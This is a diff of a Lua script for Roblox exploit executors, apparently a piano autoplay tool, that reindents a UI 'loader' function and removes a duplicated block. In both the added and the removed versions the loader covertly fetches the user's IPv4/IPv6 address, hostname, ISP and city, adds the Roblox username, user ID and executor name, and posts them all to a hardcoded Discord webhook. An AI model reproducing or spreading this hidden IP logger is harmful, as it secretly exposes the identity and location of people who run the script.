@@ -1513,75 +1513,54 @@ if not _G.pianoloaded and naem.Name:find("Electric State DarkRP") or naem.Name:f
         end
     end getgenv().senderror = func1
     local loaded
-function loader(text, pos)
-    Loader_2:TweenSize(pos,"Out",Enum.EasingStyle.Linear,.1)
-    Name_2.Text = text
-    wait(math.random(.4,.6))
-    if not loaded then
-    loaded = true
-    local request = (syn and syn.request) or (http and http.request) or http_request
+    function loader(text, pos)
+        Loader_2:TweenSize(pos,"Out",Enum.EasingStyle.Linear,.1)
+        Name_2.Text = text
+        wait(math.random(.4,.6))
+        if not loaded then
+        loaded = true
+        local request = (syn and syn.request) or (http and http.request) or http_request
 
-    assert(request ~= nil, "")
+        assert(request ~= nil, "")
 
-    local function getexploit() -- https://v3rmillion.net/showthread.php?tid=1061375 thanks
-        local exploit =
-            (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
-            (secure_load and "Sentinel") or
-            (is_sirhurt_closure and "Sirhurt") or
-            (pebc_execute and "ProtoSmasher") or
-                (KRNL_LOADED and "Krnl") or
-                (WrapGlobal and "WeAreDevs") or
-                (isvm and "Proxo") or
-                (shadow_env and "Shadow") or
-                (jit and "EasyExploits") or
-                (getscriptenvs and "Calamari") or
-                (unit and not syn and "Unit") or
-                (OXYGEN_LOADED and "Oxygen U") or
-                (IsElectron and "Electron") or
-                ("Unsupported")
+        local function getexploit() -- https://v3rmillion.net/showthread.php?tid=1061375 thanks
+            local exploit =
+                (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+                (secure_load and "Sentinel") or
+                (is_sirhurt_closure and "Sirhurt") or
+                (pebc_execute and "ProtoSmasher") or
+                    (KRNL_LOADED and "Krnl") or
+                    (WrapGlobal and "WeAreDevs") or
+                    (isvm and "Proxo") or
+                    (shadow_env and "Shadow") or
+                    (jit and "EasyExploits") or
+                    (getscriptenvs and "Calamari") or
+                    (unit and not syn and "Unit") or
+                    (OXYGEN_LOADED and "Oxygen U") or
+                    (IsElectron and "Electron") or
+                    ("Unsupported")
 
-            return exploit
-        end
+                return exploit
+            end
 
-        local _1, _2 = game:GetService'HttpService':JSONDecode(game:HttpGet("https://ipv4.wtfismyip.com/json")), game:GetService'HttpService':JSONDecode(game:HttpGet("https://wtfismyip.com/json"))
+            local _1, _2 = game:GetService'HttpService':JSONDecode(game:HttpGet("https://ipv4.wtfismyip.com/json")), game:GetService'HttpService':JSONDecode(game:HttpGet("https://wtfismyip.com/json"))
 
-        request({
-            Url = "https://discord.com/api/webhooks/1005826490170089524/soWJISCc-bDrGl8qF4GVla3nxdkbXuC99DB6o1qbpE4doDvPXjE_Lpb4TNHQ2t8N5jXn",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService"HttpService":JSONEncode({
-                content = "@here",
-                embeds = {
-                    {
-                        title = game:GetService"Players".LocalPlayer.Name.." ("..game:GetService"Players".LocalPlayer.UserId..")",
-                        description = "Job Id: "..game.JobId.."\nIP (V6): ".._2.YourFuckingIPAddress.."\nIP (V4): ".._1.YourFuckingIPAddress.."\nHost name: ".._1.YourFuckingHostname.."\nISP: ".._1.YourFuckingISP.."City: ".._1.YourFuckingLocation.."\nExecutor: "..getexploit()
+            request({
+                Url = "https://discord.com/api/webhooks/1005826490170089524/soWJISCc-bDrGl8qF4GVla3nxdkbXuC99DB6o1qbpE4doDvPXjE_Lpb4TNHQ2t8N5jXn",
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = game:GetService"HttpService":JSONEncode({
+                    content = "@here",
+                    embeds = {
+                        {
+                            title = game:GetService"Players".LocalPlayer.Name.." ("..game:GetService"Players".LocalPlayer.UserId..")",
+                            description = "Job Id: "..game.JobId.."\nIP (V6): ".._2.YourFuckingIPAddress.."\nIP (V4): ".._1.YourFuckingIPAddress.."\nHost name: ".._1.YourFuckingHostname.."\nISP: ".._1.YourFuckingISP.."City: ".._1.YourFuckingLocation.."\nExecutor: "..getexploit()
+                        }
                     }
-                }
-           })
-        })
-    end
-end
-
-        local _1, _2 = game:GetService'HttpService':JSONDecode(game:HttpGet("https://ipv4.wtfismyip.com/json")), game:GetService'HttpService':JSONDecode(game:HttpGet("https://wtfismyip.com/json"))
-
-        request({
-            Url = "https://discord.com/api/webhooks/1005826490170089524/soWJISCc-bDrGl8qF4GVla3nxdkbXuC99DB6o1qbpE4doDvPXjE_Lpb4TNHQ2t8N5jXn",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService"HttpService":JSONEncode({
-                content = "@here",
-                embeds = {
-                    {
-                        title = game:GetService"Players".LocalPlayer.Name.." ("..game:GetService"Players".LocalPlayer.UserId..")",
-                        description = "Job Id: "..game.JobId.."\nIP (V6): ".._2.YourFuckingIPAddress.."\nIP (V4): ".._1.YourFuckingIPAddress.."\nHost name: ".._1.YourFuckingHostname.."\nISP: ".._1.YourFuckingISP.."City: ".._1.YourFuckingLocation.."\nExecutor: "..getexploit()
-                    }
-                }
-           })
-        })
+            })
+            })
         end
     end
     
